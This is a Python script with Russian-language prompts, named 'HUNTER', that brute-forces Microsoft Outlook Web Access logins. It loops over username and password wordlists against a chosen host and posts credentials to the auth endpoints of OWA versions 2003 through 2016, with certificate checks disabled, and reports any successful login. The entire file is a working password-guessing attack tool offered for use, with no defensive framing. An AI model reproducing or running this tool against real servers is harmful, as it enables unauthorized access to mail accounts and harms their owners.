import os
import time
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import threading
from urllib.parse import urlparse

class Hunter:
    def __init__(self):
        self.pass_file = None
        self.user_file = None
        self.rhost = None
        self.speed = 0.5  # 2 запроса в секунду
        self.domain = None
        self.version = None
        self.found = False

    def start(self):
        print("\033[91mHUNTER\033[0m")
        print("1. Настроить брут")
        print("2. Выход")
        choice = input("Введите номер действия: ")
        if choice == "1":
            self.configure_brute()
        elif choice == "2":
            os._exit(0)
        else:
            print("Неверный выбор")
            self.start()

    def configure_brute(self):
        print("Команда пароли:")
        self.pass_file = input("Введите команду: ")
        if self.pass_file.startswith("set pass_file "):
            self.pass_file = self.pass_file.split(" ")[2]
        else:
            print("Неверная команда")
            self.configure_brute()
            return
        print("Команда логины:")
        self.user_file = input("Введите команду: ")
        if self.user_file.startswith("set user_file "):
            self.user_file = self.user_file.split(" ")[2]
        else:
            print("Неверная команда")
            self.configure_brute()
            return
        print("Имя сервера:")
        self.rhost = input("Введите команду: ")
        if self.rhost.startswith("set rhost "):
            self.rhost = self.rhost.split(" ")[2]
        else:
            print("Неверная команда")
            self.configure_brute()
            return
        print("Версия OWA (2003, 2007, 2010, 2013, 2016):")
        self.version = input("Введите версию: ")
        if self.version not in ["2003", "2007", "2010", "2013", "2016"]:
            print("Неверная версия")
            self.configure_brute()
            return
        print("Домен (необязательно):")
        self.domain = input("Введите домен: ")
        print("Запуск:")
        run = input("Введите команду: ")
        if run == "run":
            self.brute()
        else:
            print("Неверная команда")
            self.configure_brute()

    def brute(self):
        with open(self.pass_file, "r") as f:
            passwords = f.readlines()
        with open(self.user_file, "r") as f:
            users = f.readlines()
        for user in users:
            user = user.strip()
            for password in passwords:
                password = password.strip()
                if self.found:
                    print("Пароль подберёт! Остановка брута.")
                    return
                print(f"Попытка входа с логином {user} и паролем {password}")
                if self.domain:
                    user = self.domain + "\\" + user
                try:
                    if self.version == "2003":
                        self.owa_2003_brute(user, password)
                    elif self.version == "2007":
                        self.owa_2007_brute(user, password)
                    elif self.version == "2010":
                        self.owa_2010_brute(user, password)
                    elif self.version == "2013":
                        self.owa_2013_brute(user, password)
                    elif self.version == "2016":
                        self.owa_2016_brute(user, password)
                except Exception as e:
                    pass
                time.sleep(self.speed)

    def owa_2003_brute(self, user, password):
        url = f"https://{self.rhost}/exchweb/bin/auth/owaauth.dll"
        data = f"destination=https://{self.rhost}&flags=0&trusted=0&username={user}&password={password}"
        headers = {"Cookie": "PBack=0"}
        try:
            response = requests.post(url, data=data, headers=headers, verify=False)
        except requests.exceptions.RequestException as e:
            pass
        if response.status_code == 200 and "Inbox" in response.text:
            print(f"Успешный вход: {user}:{password}")
            self.found = True
            return

    def owa_2007_brute(self, user, password):
        url = f"https://{self.rhost}/owa/auth/owaauth.dll"
        data = f"destination=https://{self.rhost}&flags=0&trusted=0&username={user}&password={password}"
        headers = {"Cookie": "PBack=0"}
        try:
            response = requests.post(url, data=data, headers=headers, verify=False)
        except requests.exceptions.RequestException as e:
            pass
        if response.status_code == 200 and "addrbook.gif" in response.text:
            print(f"Успешный вход: {user}:{password}")
            self.found = True
            return

    def owa_2010_brute(self, user, password):
        url = f"https://{self.rhost}/owa/auth.owa"
        data = f"destination=https://{self.rhost}/owa&flags=4&forcedownlevel=0&username={user}&password={password}&isUtf8=1"
        headers = {"Cookie": "PBack=0"}
        try:
            response = requests.post(url, data=data, headers=headers, verify=False)
        except requests.exceptions.RequestException as e:
            pass
        if response.status_code == 200 and ("Inbox" in response.text or "logoff.owa" in response.text):
            print(f"Успешный вход: {user}:{password}")
            self.found = True
            return

    def owa_2013_brute(self, user, password):
        url = f"https://{self.rhost}/owa/auth.owa"
        data = f"destination=https://{self.rhost}/owa&flags=4&forcedownlevel=0&username={user}&password={password}&isUtf8=1"
        headers = {"Cookie": "PBack=0"}
        try:
            response = requests.post(url, data=data, headers=headers, verify=False)
        except requests.exceptions.RequestException as e:
            pass
        if response.status_code == 200 and ("Inbox" in response.text or "logoff.owa" in response.text):
            print(f"Успешный вход: {user}:{password}")
            self.found = True
            return

    def owa_2016_brute(self, user, password):
        url = f"https://{self.rhost}/owa/auth.owa"
        data = f"destination=https://{self.rhost}/owa&flags=4&forcedownlevel=0&username={user}&password={password}&isUtf8=1"
        headers = {"Cookie": "PBack=0"}
        try:
            response = requests.post(url, data=data, headers=headers, verify=False, timeout=5)
        except requests.exceptions.RequestException as e:
            pass
        if response.status_code == 200 and ("Inbox" in response.text or "logoff.owa" in response.text):
            print(f"Успешный вход: {user}:{password}")
            self.found = True
            return

if __name__ == "__main__":
    hunter = Hunter()
    hunter.start()
